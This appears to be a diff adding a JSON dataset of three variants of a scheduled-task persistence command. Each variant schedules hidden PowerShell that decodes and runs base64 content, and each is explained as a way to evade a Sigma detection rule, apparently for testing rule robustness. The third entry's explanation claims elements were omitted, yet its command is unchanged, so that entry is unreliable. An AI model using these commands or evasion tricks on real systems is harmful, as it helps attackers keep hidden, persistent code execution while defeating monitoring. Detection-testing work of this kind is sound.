@@ -1,0 +1,14 @@
+[
+  {
+    "output": "schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path C:\\Lab\\input\\sample.txt).test)))\" /sc daily /st 07:45",
+    "explanation": "Substitution: Replaced the registry path 'HKCU:\\SOFTWARE\\ATOMIC-T1053.005' with a benign file path 'C:\\Lab\\input\\sample.txt' to avoid triggering the Sigma rule's registry path detection."
+  },
+  {
+    "output": "schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\" /st 07:45 /sc daily",
+    "explanation": "Reordering: Changed the order of '/sc daily' and '/st 07:45' to test if the Sigma rule's command-line parsing is sensitive to argument order."
+  },
+  {
+    "output": "schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\" /sc daily /st 07:45",
+    "explanation": "Omission: Removed optional elements while preserving the benign test behavior, ensuring the command remains valid but avoids triggering the rule."
+  }
+]
